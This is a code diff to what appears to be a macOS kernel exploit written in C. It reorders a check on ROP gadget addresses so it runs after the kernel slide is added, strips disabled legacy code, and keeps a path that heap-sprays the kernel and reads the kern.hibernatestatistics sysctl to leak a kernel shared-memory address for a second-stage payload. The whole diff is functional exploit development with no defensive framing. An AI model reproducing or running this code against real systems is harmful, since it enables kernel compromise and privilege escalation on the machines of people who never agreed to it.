@@ -73,11 +73,7 @@ typedef struct
     const char **hib_names;
     const char *hib_full;
     uint32_t hib_lo;
-#if 0
-    uint32_t vtab_lo; XXX
-#else
     uint32_t rop_hi;
-#endif
     int32_t offset_amount;
 } cb_args_t;
 
@@ -150,13 +146,6 @@ int main(int argc, const char **argv)
         goto out1;
     }
 
-    // We switch out these addresses through hib, so we need the top 32 bits to be the same
-    if((rop.jmp__vtab1_ >> 32) != (rop.mov_rsi_r15_call__vtab0_ >> 32))
-    {
-        ERR("jmp__vtab1_ and mov_rsi_r15_call__vtab0_ are too far apart, sorry. :(");
-        goto out1;
-    }
-
     uint64_t slide = get_kernel_slide(kernel.buf);
     if((slide % SLIDE_STEP) != 0)
     {
@@ -166,6 +155,13 @@ int main(int argc, const char **argv)
     for(uint64_t *ptr = (uint64_t*)&rop, *end = (uint64_t*)&rop.taggedRelease_vtab_offset; ptr < end; ++ptr)
     {
         *ptr += slide;
+    }
+
+    // We switch out these addresses through hib, so we need the top 32 bits to be the same
+    if((rop.jmp__vtab1_ >> 32) != (rop.mov_rsi_r15_call__vtab0_ >> 32))
+    {
+        ERR("jmp__vtab1_ and mov_rsi_r15_call__vtab0_ are too far apart, sorry. :(");
+        goto out1;
     }
 
     task_t self = mach_task_self();
@@ -327,7 +323,6 @@ int main(int argc, const char **argv)
 
     uint64_t ptr_addr = rop._hibernateStats + ((uint8_t*)&hib_base[2] - (uint8_t*)&hib) - rop.taggedRelease_vtab_offset;
     uint32_t *ptr_ptr = (uint32_t*)&ptr_addr;
-    //uint64_t rop_addr = rop.add__rdi__ecx; XXX
     uint64_t rop_addr = rop.jmp__vtab1_;
     uint32_t *rop_ptr = (uint32_t*)&rop_addr;
     hib.graphicsReadyTime    = ptr_ptr[0];
@@ -413,11 +408,7 @@ int main(int argc, const char **argv)
         .hib_names = hib_names,
         .hib_full = "kern.hibernatestatistics",
         .hib_lo = hib_ptr[0],
-#if 0
-        .vtab_lo = ptr_ptr[0], XXX
-#else
         .rop_hi = rop_ptr[1],
-#endif
         .offset_amount = offset_amount,
     };
     ret = heap_spray(master, payload_offset, NULL, 0, &cb, &args);
@@ -808,31 +799,7 @@ static kern_return_t cb(void *arg)
 
     cb_args_t *args = arg;
     uint64_t kernel_addr;
-#if 0
-    int32_t val = 0;
-    size_t size = sizeof(val);
-    if(sysctlbyname(args->hib_names[0], &val, &size, NULL, 0) != 0)
-    {
-        printf("\n");
-        ERR("sysctl(\"%s\") failed: %s", args->hib_names[0], strerror(errno));
-        return KERN_FAILURE;
-    }
 
-    // No change, no action
-    if(val == args->vtab_lo) XXX
-    {
-        ualarm(EXPLOIT_TIMEOUT, 0);
-        return KERN_SUCCESS;
-    }
-    // If the value DID change, then we just leaked an address and
-    // can now prepare the stage 2 payload.
-
-    // Trick: shmem can have upper 32 bits 0xffffff91 or 0xffffff92, but
-    // the lower 32 bits are either very high or very low depending on that.
-    // Perfect case for signed int addition. :P
-    val -= args->vtab_lo + args->offset_amount;
-    kernel_addr = 0xffffff9200000000ULL + val;
-#else
     hibernate_statistics_t hib;
     size_t size = sizeof(hib);
     if(sysctlbyname(args->hib_full, &hib, &size, NULL, 0) != 0)
@@ -853,7 +820,6 @@ static kern_return_t cb(void *arg)
 
     memcpy(&kernel_addr, (char*)&hib.graphicsReadyTime + args->rop->OSArray_array_offset, sizeof(kernel_addr));
     kernel_addr -= args->offset_amount;
-#endif
     printf("\n"); // from the percentage counter
     LOG("Shmem kernel address: 0x%016llx", kernel_addr);
 
